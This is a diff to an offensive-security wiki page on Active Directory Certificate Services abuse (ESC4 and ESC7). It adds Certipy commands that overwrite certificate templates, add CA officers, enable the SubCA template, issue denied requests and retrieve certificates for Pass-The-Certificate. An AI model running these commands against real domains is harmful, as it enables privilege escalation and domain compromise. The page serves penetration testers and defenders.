@@ -48,7 +48,20 @@ In order to obtain an abusable template, some attributes and parameters need to 
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate these sensitive access control entries, and [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate) (Python) can be used to modify the template.
+From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate these sensitive access control entries, and to overwrite the template in order to add the SAN attribute and make it vulnerable to ESC1. It also had the capacity to save the old configuration in order to restore it after the attack.
+
+```python
+# 1. Enumerate sensitive access control entries
+certipy 'domain.local'/'user':'password'@'domaincontroller' find
+
+# 2. Overwrite the certificate template and save the old configuration
+certipy 'domain.local'/'user':'password'@'domaincontroller' template -template templateName -save-old
+
+# 3. After the ESC1 attack, restore the original configuration
+certipy 'domain.local'/'user':'password'@'domaincontroller' template -template templateName -configuration 'templateName.json'
+```
+
+If a more precise template modification is needed, [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate) (Python) can be used to modify each attributes of the template.
 
 ```python
 # 1. Enumerate sensitive access control entries
@@ -105,14 +118,29 @@ Currently, the best resources for manually abusing this are&#x20;
 
 ### Certificate Authority (ESC7)
 
+When it is not possible to restart the `CertSvc` service to enable the `EDITF_ATTRIBUTESUBJECTALTNAME2 attribute`,the built-in template **SubCA** can be usefull.
+
+It is vulnerable to the ESC1 attack, but only **Domain Admins** and **Enterprise Admins** can enroll in it. If a standard user try to enroll in it with [Certipy](https://github.com/ly4k/Certipy), he will encounter a `CERTSRV_E_TEMPLATE_DENIED` errror and will obtain a request ID with a corresponding private key.
+
+This ID can be used by a user with the **ManageCA** _and_ **ManageCertificates** rights to validate the failed request. Then, the user can retrieve the issued certificate by specifying the same ID.
+
 #### ManageCA Rights
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate access rights over the CA object.
+From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate access rights over the CA object and modify some CA's attributes like the officiers list (an officier is a user with the **ManageCertificate** rights) or the enabled certificate templates.
 
 ```python
 certipy 'domain.local'/'user':'password'@'domaincontroller' find
+
+# Add a new officier
+certipy 'domain.local'/'user':'password'@'domaincontroller' ca -ca 'ca_name' -add-officier 'user'
+
+# List all the templates
+certipy 'domain.local'/'user':'password'@'domaincontroller' ca -ca 'ca_name' -list-templates
+
+# Enable a certificate template
+certipy 'domain.local'/'user':'password'@'domaincontroller' ca -ca 'ca_name' -enable-template 'SubCA'
 ```
 
 {% hint style="info" %}
@@ -157,11 +185,19 @@ DISM.exe /Online /add-capability /CapabilityName:Rsat.CertificateServices.Tools~
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate access rights over the CA object.
+From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate access rights over the CA object. Coupled with the **ManageCA** right, it is possible to issue a certificate from a failed request.
 
 ```python
 certipy 'domain.local'/'user':'password'@'domaincontroller' find
+
+# Issue a failed request (need ManageCA and ManageCertificates rights for a failed request)
+certipy 'domain.local'/'user':'password'@'domaincontroller' ca -ca 'ca_name' -issue-request 100
+
+# Retrieve an issued certificate
+certipy 'domain.local'/'user':'password'@'domaincontroller' req -ca 'ca_name' -request 100
 ```
+
+The certificate can then be used with [Pass-The-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
 
 {% hint style="info" %}
 By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
@@ -198,6 +234,7 @@ If sensitive rights are identified, creativity will be the best ally. Not much p
 Currently, the best resources for manually abusing this are&#x20;
 
 * [the whitepaper](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf) (PDF)
+* [Certipy 2.0: BloodHound, New Escalations, Shadow Credentials, Golden Certificates, and more! (by Olivier Lyak)](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6)
 * [Abusing weak ACL on Certificate Templates (by daemon0cc0re)](https://github.com/daem0nc0re/Abusing\_Weak\_ACL\_on\_Certificate\_Templates)
 * [AD-CS The Certified Pre Owned Attacks (by HTTP418)](https://http418infosec.com/ad-cs-the-certified-pre-owned-attacks#esc4)
 * [AD CS Abuse (by snovvcrash)](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse#vulnerable-ca-aces-esc7)
@@ -207,6 +244,8 @@ Currently, the best resources for manually abusing this are&#x20;
 
 This can be enumerated and abused like regular AD access control abuses. Once control over an AD-CS-related is gained, creativity will be the attacker's best ally.
 
+
+
 {% content-ref url="../access-controls/" %}
 [access-controls](../access-controls/)
 {% endcontent-ref %}
@@ -214,6 +253,8 @@ This can be enumerated and abused like regular AD access control abuses. Once co
 ## Resources
 
 {% embed url="https://posts.specterops.io/certified-pre-owned-d95910965cd2" %}
+
+{% embed url="https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6" %}
 
 {% embed url="https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment#section-3-6" %}
 
